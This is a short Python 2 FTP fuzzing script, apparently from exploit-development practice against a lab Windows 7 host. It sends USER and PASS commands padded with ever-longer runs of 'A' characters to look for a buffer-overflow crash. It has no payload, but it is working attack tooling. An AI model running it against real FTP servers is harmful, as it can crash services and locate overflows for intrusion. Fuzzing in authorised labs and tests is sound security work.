#!/usr/bin/python
import socket

RHOST = "10.0.2.8"
RPORT = 21

#Array of A's
buff = ["A"]
counter = 100

#Loop to build array
while len(buff) <= 30:
    buff.append("A" * counter)
    counter += 200

#Attempt to login to FTP
for string in buff:
    print "Fuzzing USER and PASS with %s bytes" % len(string)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #Connect to Win7 machine
    connect = s.connect((RHOST, RPORT))
    s.recv(1024)
    s.send('USER ' + string + '\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
